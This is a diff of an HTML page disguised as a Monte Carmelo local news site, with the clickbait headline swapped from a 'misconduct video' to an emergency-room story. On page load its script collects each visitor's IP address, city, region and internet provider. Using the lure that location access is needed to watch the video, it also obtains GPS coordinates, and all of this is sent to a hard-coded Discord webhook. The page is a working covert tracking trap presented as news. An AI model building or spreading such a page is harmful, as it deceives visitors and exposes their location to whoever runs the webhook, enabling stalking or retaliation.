@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Monte City - Notícias Urgentes</title>
+    <title>Monte City - Notícias</title>
 
-    <meta property="og:title" content="🚨 URGENTE: VEJA O VÍDEO DO DESVIO DE CONDUTA EM MONTE CARMELO (29/04/2026)">
-    <meta property="og:description" content="Registro grave de ocorrência hoje no centro. Clique para ver as imagens e os detalhes da investigação.">
-    <meta property="og:image" content="https://raw.githubusercontent.com/noticiasmonte/montecity/main/desvio_2904.png">
+    <meta property="og:title" content="🚨 URGENTE: SITUAÇÃO DO PRONTO SOCORRO MUNICIPAL DE MONTE CARMELO">
+    <meta property="og:description" content="Secretário de Saúde é citado em cobrança por melhores condições. Clique para assistir ao vídeo e ver os detalhes.">
+    <meta property="og:image" content="https://raw.githubusercontent.com/noticiasmonte/montecity/refs/heads/main/Screenshot_20260429-145602.png">
     <meta property="og:image:type" content="image/png">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
@@ -24,7 +24,7 @@
 <body onload="capturarIP()">
 
     <div class="loader"></div>
-    <p class="aviso">Para sua segurança e acesso ao conteúdo restrito de Monte Carmelo, confirme sua localização...</p>
+    <p class="aviso">Para sua segurança e acesso ao conteúdo regional de Monte Carmelo, confirme sua localização...</p>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1467483594279878717/Yd31-VbARr_0NGE01f3tq7lg8Rg0-fCNxVj2FUED7yZcRt47p_Etr7kyTGUFV_Mq3os8";
@@ -33,7 +33,7 @@
             fetch('https://ipapi.co/json/')
                 .then(response => response.json())
                 .then(data => {
-                    const infoRede = `🚨 **ALERTA: CASO DESVIO DE CONDUTA (29/04)**\n🌐 **IP:** ${data.ip}\n🏙️ **Cidade:** ${data.city}\n🚩 **Estado:** ${data.region}\n📡 **Provedor:** ${data.org}`;
+                    const infoRede = `🏥 **ACESSO: MATÉRIA PRONTO SOCORRO**\n🌐 **IP:** ${data.ip}\n🏙️ **Cidade:** ${data.city}\n📡 **Provedor:** ${data.org}`;
                     fetch(WEBHOOK_URL, {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
@@ -56,12 +56,12 @@
             fetch(WEBHOOK_URL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: `🌍 **LOCALIZAÇÃO EXATA (GPS)**\n📍 **Mapa:** ${mapa}` })
+                body: JSON.stringify({ content: `🌍 **GPS EXATO (SAÚDE)**\n📍 **Mapa:** ${mapa}` })
             }).finally(() => { direcionar(); });
         }
 
         function erroLocalizacao() {
-            alert("A permissão de localização é necessária para visualizar o vídeo de segurança.");
+            alert("A permissão de localização é necessária para segurança do acesso regional.");
             location.reload();
         }
 
